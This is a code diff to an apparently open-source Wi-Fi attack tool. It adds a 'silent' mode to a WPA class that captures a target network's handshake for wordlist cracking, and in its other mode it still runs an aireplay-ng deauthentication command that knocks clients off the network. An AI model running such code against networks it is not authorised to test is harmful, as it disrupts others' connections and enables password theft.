@@ -17,7 +17,7 @@ import csv
 
 class WPA(EncryptionType):
 
-    def __init__(self, network, interface, wordlist, verbose_level):
+    def __init__(self, network, interface, wordlist, verbose_level, silent_attack):
         """
         Constructor for the class WPA. Calls the parent's class consturctor
         :param network: selected target network
@@ -27,7 +27,7 @@ class WPA(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
-        EncryptionType.__init__(self, network, interface, verbose_level)
+        EncryptionType.__init__(self, network, interface, verbose_level, silent_attack)
         self.wordlist = wordlist
         self.pmk = ""
 
@@ -48,11 +48,13 @@ class WPA(EncryptionType):
 
         write_directory += 'net_attack-01.cap'
 
-        pyrit_cmd = ['pyrit', '-r', write_directory + '.bak', 'analyze']
+        pyrit_cmd = ['pyrit', '-r', write_directory, 'analyze']
         cowpatty_cmd = ['cowpatty', '-c', '-r', write_directory]
-        de_auth_cmd = ['aireplay-ng', '-0', '3', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface + 'mon']
-
-        second_iterator = 5  # when 15, de-auth's clients on the network
+        de_auth_cmd = ['aireplay-ng', '-0', '3', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface]
+        if self.silent_attack:
+            super().show_message("Running silent attack (no de-authing)")
+        else:
+            second_iterator = 5  # when 15, de-auth's clients on the network
 
         while not valid_handshake:
             pyrit_out, err = self.execute_command(pyrit_cmd)
@@ -60,11 +62,12 @@ class WPA(EncryptionType):
             valid_handshake = self.filter_pyrit_out(pyrit_out) or self.filter_cowpatty_out(cowpatty_out)
             if not valid_handshake:
                 time.sleep(1)
-                second_iterator += 1
-                if second_iterator == 6:
-                    self.show_message("de-authing . . .")
-                    out, err = self.execute_command(de_auth_cmd)
-                    second_iterator = 0
+                if not self.silent_attack:
+                    if second_iterator == 6:
+                        self.show_message("de-authing . . .")
+                        out, err = self.execute_command(de_auth_cmd)
+                        second_iterator = 0
+                    else: second_iterator += 1
             else:
                 break
 
